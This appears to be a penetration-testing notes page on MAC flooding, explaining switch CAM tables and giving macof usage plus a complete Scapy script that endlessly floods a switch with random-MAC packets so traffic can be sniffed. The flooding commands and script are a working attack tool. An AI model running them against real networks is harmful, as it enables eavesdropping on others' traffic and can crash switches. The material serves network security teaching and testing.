# MAC Flood

## CAM Table&#x20;

![](<../../.gitbook/assets/image (298) (1).png>)

• CAM Table stands for Content Addressable Memory

• The CAM Table stores information such as MAC addresses available on physical ports with their associated VLAN parameters

• CAM Tables have a fixed size

## Normal CAM Behavior

![](<../../.gitbook/assets/image (277) (1) (1).png>)

![](<../../.gitbook/assets/image (300) (1) (1).png>)

![](<../../.gitbook/assets/image (276) (1) (1) (1) (1).png>)

## CAM Overflow

• Theoretical attack until May 1999&#x20;

• macof tool since May 1999 (about 100 lines of perl)

• Based on CAM Table’s limited size

![](<../../.gitbook/assets/image (293) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (281) (1).png>)

#### Dsniff (macof) can generate 480,000 MAC entries on a switch per minute 8000/s\*60.

Assuming a perfect hash function the CAM table will total out at 128,000 (16,000 x 8) 131,052 to be exact Since hash isn’t perfect it actually takes 70 seconds to fill the CAM table.

#### Once table is full, traffic without a CAM entry floods on the VLAN, but NOT existing traffic with an existing CAM entry

![](<../../.gitbook/assets/image (297) (1).png>)

Syntax:

```
macof [-i interface] [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-n times]

-i   interface Specify the interface to send on.
-s   src Specify source IP address.
-d   dst Specify destination IP address.
-e   Specify target hardware address.
-x   sport Specify TCP source port.
-y   dport Specify TCP destination port.
-n   times Specify the number of packets to send
```

#### Macof can flood a switch with random MAC addresses. This is called MAC flooding. This fills in the switch’s CAM table, thus new MAC addresses can not be saved, and the switch starts to send all packets to all ports, so it starts to act as a hub, and thus we can monitor all traffic passing through it.

## Targeted Flooding

Macof can flood a switch with random MAC addresses destinated to 192.168.1.1.

```
macof -i eth1 -n 10
```

While conducting a pentest, this tool comes in handy while sniffing. Some switches don’t allow to spoof arp packets. This tool can be used in such situations to check if the switch is overloaded. Some switches behave like hubs, transmitting all source packets to all destinations. Then sniffing would be very easy. Some switches tend to crash & reboot also. Such kind of layer 2 stress testing can be done with this handy tool

## MAC flooding with scapy

```python
#! /usr/bin/python

nbpkts = 8192
iface = "eth0"

import sys
from scapy.all import sendpfast, Ether, IP, RandIP, RandMAC, TCP

print("Initializing...")

# We first build all packets...
pkts = []
for i in xrange(0, nbpkts):
  macaddr = str(RandMAC())
  # Quick-and-dirty way to ensure that the I/G remains unset
  macaddr = macaddr[:1] + "0" + macaddr[2:]
  # This packet structure mimics a TCP SYN sent to a HTTP server.
  # A random dst mac should also work, setting one fixed can be useful
  # to easily filter-out flood-related packets when capturing traffic.
  # You can use IPs valid for your range, but be cautious that if any
  # host is made to send some RST for instance its MAC address will be
  # registered by the switches.
  pkts.append(Ether(src=macaddr, dst="ff:ff:ff:ff:ff:ff")/
              IP(src=str(RandIP()), dst=str(RandIP()))/
              TCP(dport=80, flags="S", options=[('Timestamp', (0, 0))]))

print("Launching attack, press Ctrl+C to stop...")

# ...and then we send them in loop.
while True:
  # Adapt pps (Packets Per Second) to your needs. Running a complex
  # GNS3 topology on a low-end machine will take all the CPU causing
  # packet loss, pps will then need to be high to replay lost packets.
  # Given enough CPU, packet loss can remain low and pps can be lowered
  # too.
  sendpfast(pkts, iface=iface, file_cache=True, pps=5000, loop=999)

```
